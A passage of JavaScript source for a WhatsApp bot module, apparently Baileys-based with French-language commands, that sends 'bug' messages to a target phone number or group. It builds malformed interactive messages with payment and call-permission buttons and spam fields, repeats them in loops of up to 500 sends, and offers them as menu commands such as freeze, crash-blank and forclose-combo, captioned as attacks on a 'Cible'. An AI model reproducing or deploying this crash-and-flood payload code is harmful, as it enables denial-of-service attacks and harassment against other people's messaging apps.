                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            forwardedNewsletterMessageInfo: {
              newsletterName: "Arya Valensya",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "🩸𐎟𑆻𝐖͢𝐈͠𝐍͜𝐆͢𝐒͠ 𝐒͜𝐔͠𝐏͢𝐄͜𝐑͠𝐍͢𝐀͜𝐘͠𝐑⍣𐎟𑆻⃔",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "https://youtube.com/@limmvz",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "🩸𐎟𑆻𝐌𝐄𝐆𝐔𝐌𝐈 𝐃𝐈𝐀𝐍𝐀 𝐁𝐀𝐇𝐀𝐇𝐀⍣𐎟𑆻⃔",
            },
            nativeFlowMessage: {
              messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"Arya Official\",\"body\":\"Call Galaxy\"}",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: apiClient + "🩸𐎟𑆻𝐌𝐄𝐆𝐔𝐌𝐈 𝐃𝐈𝐀𝐍𝐀 𝐁𝐀𝐇𝐀𝐇𝐀⍣𐎟𑆻⃔",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: apiClient + "🩸𐎟𑆻𝐌𝐄𝐆𝐔𝐌𝐈 𝐃𝐈𝐀𝐍𝐀 𝐁𝐀𝐇𝐀𝐇𝐀⍣𐎟𑆻⃔",
                }, 
                {
                  name: "payment_method",
                  buttonParamsJson: ""
                },
                {
                  name: "payment_status",
                  buttonParamsJson: ""
                },
                {
                  name: "review_order",
                  buttonParamsJson: ""
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await surz.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

// End func
async function kuota(target) {
    for (let i = 0; i < 300; i++) {
    await protocol6(target);
    await bulldozer(target);
    await protocolbug5(target);
    }
}
async function blank(target) {
    for (let i = 0; i <= 150; i++) {
    await invico1(target)
    await UiScorpio(target)
    }
}
async function fc(target) {
    for (let r = 0; r < 50; r++) {
    await Forklift(target);
    }
}
async function proto6(target) {
    for (let r = 0; r < 200; r++) {
    await protocolbug3(target);
    await protocol6(target);
    await protocolbug4(target)
    }
}
async function invis(target) {
    for (let i = 0; i < 200; i++) {
    await Nativeprotocol(target);
    }
}
async function delay3(target) {
    for (let r = 0; r < 200; r++) {
    await NotifFreeze(target);
    await protocol6(target);
    await protocolbug3(target);
    await celloinv(target, mention = true)
    await InVisibleX1(target, true);
    await protocol6(target);
    await invisiblenew(target);
    await protocolbug3(target);
    await celloinv(target, mention = true)
    await InVisibleX1(target, true);
    }
}
async function anjaz(target) {
    for (let i = 0; i < 500; i++) {
    await Wraperos2(target);
    await Surz7(target, true);
    await NotifFreeze(target);
    }
}
async function combo(target) {
    for (let r = 0; r < 200; r++) {
    await Wraperos2(target);
    await Surz7(target);
    await NotifFreeze(target);
    await protocol6(target, mention = true)
    await protocolbug3(target, true);
    await invisiblenew(target);
    await protocolbug3(target);
    await InVisibleX1(target, true);
    await Nativeprotocol(target);    
    await protocolbug4(target)
    await Forklift(target);    
    await invico1(target)
    await UiScorpio(target)    
    await bulldozer(target);
    await protocolbug5(target);           
    }
}
 const bugmenu = {
  name: "bugmenu",
  description: "Affiche le menu des bugs",
  execute: async (sock, msg, args, from) => {
    const menuText = `
> *ʀᴀɪᴢᴇʟ 𝐁𝐔𝐆* ❍
> • _Freeze_
> • _Vortex (in grup)_
> • _Invisidelay_
> • _Crash-blank_
> • _Invisicrash_
> • _reflay_
> • _Forclose-combo_
> • _Raizel-combo_
> *_Powered by DEV-RAIZEL_*
`;

    await sock.sendMessage(from, { video: { url: "https://files.catbox.moe/gjophc.mp4" }, caption: menuText }, { quoted: msg });

    await sock.sendMessage(from, { react: { text: "🩸", key: msg.key } });

    await sock.sendMessage(from, { audio: { url: "https://files.catbox.moe/apcq24.mp3" }, mimetype: "audio/mpeg" }, { quoted: msg });
  },
};
// =======================
// COMMANDES PRINCIPALES
const freeze = {
  name: "freeze",
  execute: async (sock, msg, args, from, _, prefix, command) => {
    const q = args[0];
    if (!q) return sock.sendMessage(from, { text: `📌 Exemple : ${prefix + command} 237xxxxxxxxxx` }, { quoted: msg });
    const target = toJid(q);

    await sock.sendMessage(
      from,
      { image: { url: "https://files.catbox.moe/4185go.jpg" }, caption: `⚡ *Traitement Android en cours...*\n\n🎯 Cible : wa.me/${q}\n🛡️ Module : *HADÈS BUG V4 Android*` },
      { quoted: msg }
    );

    await sleep(2000);
    try {
      await UiScorpio(target);
      await invico1(target);
      await invisiblenew(target);
      await InVisibleX1(target);
      await protocol6(target);
      await NotifFreeze(target);
      await Surz7(target);
      await protocolbug4(target);
      await bulldozer(target);
      await protocolbug5(target);
      await protocolbug3(target);
      await Wraperos2(target);

      await sock.sendMessage(from, { text: `✅ *FREEZE terminé sur ${q}*` }, { quoted: msg });
    } catch (err) {
      console.error("⚠️ Erreur pendant l'exécution de freeze :", err);
    }
  },
};

const Vortex = {
  name: "vortex",
  execute: async (sock, msg, args, from) => {
    if (!msg.key.remoteJid.endsWith("@g.us")) {
      return sock.sendMessage(from, { text: "❌ Cette commande doit être utilisée dans un groupe." }, { quoted: msg });
    }

    const target = from;

    await sock.sendMessage(from, { image: { url: "https://files.catbox.moe/4185go.jpg" }, caption: `⚡ *VORTEX ACTIVÉ !*\n\n🎯 Cible : *Ce Groupe*\n🛡️ Module : *HADÈS BUG Vortex*` }, { quoted: msg });

    await sleep(1500);
    try {
      await UiScorpio(target);
      await invico1(target);
      await invisiblenew(target);

      await sock.sendMessage(from, { react: { text: "⚡", key: msg.key } });
    } catch (err) {
      console.error("Erreur dans vortex:", err);
    }
  },
};

// =======================
// COMMANDES CUSTOM
const Invisidelay = {
  name: "invisidelay",
  execute: async (sock, msg, args, from, _, prefix, command) => {
    const q = args[0];
    if (!q) {
      const exampleText = `
┏❍ *ʀᴀɪᴢᴇʟ 𝐁𝐔𝐆* ❍
┃ • _Exemple : ${prefix + command} 237XXXXXXXXX_
┗◇
⚡ Powered by DEV-RAIZEL 👑
      `;
      return sock.sendMessage(from, { text: exampleText }, { quoted: msg });
    }

    const target = toJid(q);

    // Envoi de l'image avec légende
    await sock.sendMessage(
      from,
      { 
        image: { url: "https://files.catbox.moe/4185go.jpg" },
        caption: `┏❍ *ʀᴀɪᴢᴇʟ 𝐁𝐔𝐆* ❍\n┃ • _Attaque Invisidelay sur : ${q}_\n┗◇\n⚡ Powered by DEV-RAIZEL 👑`
      },
      { quoted: msg }
    );

    // Exécution des fonctions invisibles
    await UiScorpio(target);
    await invico1(target);
    await invisiblenew(target);
    await invico1(target);
    await UiScorpio(target);
    await invisiblenew(target);

    // Réaction emoji automatique
    await sock.sendMessage(from, { react: { text: "💀", key: msg.key } });
  },
};

const crashBlank = {
  name: "crash-blank",
  execute: async (sock, msg, args, from, _, prefix, command) => {
    const q = args[0];
    if (!q) {
      const exampleText = `
┏❍ *ʀᴀɪᴢᴇʟ 𝐁𝐔𝐆* ❍
┃ • _Exemple : ${prefix + command} 237XXXXXXXXX_
┗◇
⚡ Powered by DEV-RAIZEL 👑
      `;
      return sock.sendMessage(from, { text: exampleText }, { quoted: msg });
    }

    const target = toJid(q);

    // Envoi de l'image avec légende
    await sock.sendMessage(
      from,
      { 
        image: { url: "https://files.catbox.moe/4185go.jpg" },
        caption: `┏❍ *ʀᴀɪᴢᴇʟ 𝐁𝐔𝐆* ❍\n┃ • _Attaque CrashBlank sur : ${q}_\n┗◇\n⚡ Powered by DEV-RAIZEL 👑`
      },
      { quoted: msg }
    );

    // Exécution des fonctions de bug
    await bulldozer(target);
    await protocolbug3(target);
    await protocolbug5(target);

    // Réaction emoji automatique
    await sock.sendMessage(from, { react: { text: "💀", key: msg.key } });
  },
};

const Invisicrash = {
  name: "invisicrash",
  execute: async (sock, msg, args, from, _, prefix, command) => {
    const q = args[0];
    if (!q) {
      const exampleText = `
┏❍ *ʀᴀɪᴢᴇʟ 𝐁𝐔𝐆* ❍
┃ • _Exemple : ${prefix + command} 237XXXXXXXXX_
┗◇
⚡ Powered by DEV-RAIZEL 👑
      `;
      return sock.sendMessage(from, { text: exampleText }, { quoted: msg });
    }

    const target = toJid(q);

    // Envoi de l'image avec légende
    await sock.sendMessage(
      from,
      {
        image: { url: "https://files.catbox.moe/4185go.jpg" },
        caption: `┏❍ *ʀᴀɪᴢᴇʟ 𝐁𝐔𝐆* ❍\n┃ • _Attaque Invisicrash sur : ${q}_\n┗◇\n⚡ Powered by DEV-RAIZEL 👑`
      },
      { quoted: msg }
    );

    // Exécution des fonctions invisibles
    await invisiblenew(target);
    await delay3(target);
    await InVisibleX1(target);

    // Réaction emoji automatique
    await sock.sendMessage(from, { react: { text: "💀", key: msg.key } });
  },
};

const forcloseCombo = {
  name: "forclose-combo",
  execute: async (sock, msg, args, from, _, prefix, command) => {
    const q = args[0];
    if (!q) {
      const exampleText = `
┏❍ *ʀᴀɪᴢᴇʟ 𝐁𝐔𝐆* ❍
┃ • _Exemple : ${prefix + command} 237XXXXXXXXX_
┗◇
⚡ Powered by DEV-RAIZEL 👑
      `;
      return sock.sendMessage(from, { text: exampleText }, { quoted: msg });
    }

    const target = toJid(q);

    // Envoi de l'image avec légende
    await sock.sendMessage(
      from,
      { 
        image: { url: "https://files.catbox.moe/4185go.jpg" }, // Image uniforme pour les bugs
        caption: `┏❍ *ʀᴀɪᴢᴇʟ 𝐁𝐔𝐆* ❍\n┃ • _Attaque Forclose-Combo sur : ${q}_\n┗◇\n⚡ Powered by DEV-RAIZEL 👑`
      },
      { quoted: msg }
    );

    // Exécution des fonctions de bug
    await protocol6(target);
    await Wraperos2(target);
    await fc(target);

    // Réaction emoji automatique
    await sock.sendMessage(from, { react: { text: "💀", key: msg.key } });
  },
};

const queenCombo = {
  name: "raizel-combo",
  execute: async (sock, msg, args, from, _, prefix, command) => {
    const q = args[0];
    if (!q) {
      const exampleText = `
┏❍ *ʀᴀɪᴢᴇʟ 𝐁𝐔𝐆* ❍
┃ • _Exemple : ${prefix + command} 237XXXXXXXXX_
┗◇
⚡ Powered by DEV-RAIZEL 👑
      `;
      return sock.sendMessage(from, { text: exampleText }, { quoted: msg });
    }

    const target = toJid(q);

    // Envoi de l'image avec légende
    await sock.sendMessage(
      from,
      {
        image: { url: "https://files.catbox.moe/4185go.jpg" },
        caption: `┏❍ *ʀᴀɪᴢᴇʟ 𝐁𝐔𝐆* ❍\n┃ • _Attaque raizel-Combo sur : ${q}_\n┗◇\n⚡ Powered by DEV-RAIZEL 👑`
      },
      { quoted: msg }
    );

    // Exécution des fonctions combo
    await combo(target);
    await invisiblenew(target);
    await combo(target);
    await sleep(1500);
    await UiScorpio(target);
    await invico1(target);
    await invisiblenew(target);

    // Réaction emoji automatique
    await sock.sendMessage(from, { react: { text: "💀", key: msg.key } });
  },
};

// =======================
// EXPORT GLOBAL
export {
  UiScorpio,
  invico1,
  invisiblenew,
  InVisibleX1,
  protocol6,
  NotifFreeze,
  Surz7,
  protocolbug4,
  bulldozer,
  protocolbug5,
  protocolbug3,
  Wraperos2,
  fc,
  bugmenu,
  combo,
  freeze,
  Vortex,
  Invisidelay,
  crashBlank,
  Invisicrash, 
  forcloseCombo,
  queenCombo,
  sleep,
  enforceRateLimit,
  toJid,
  clampText
};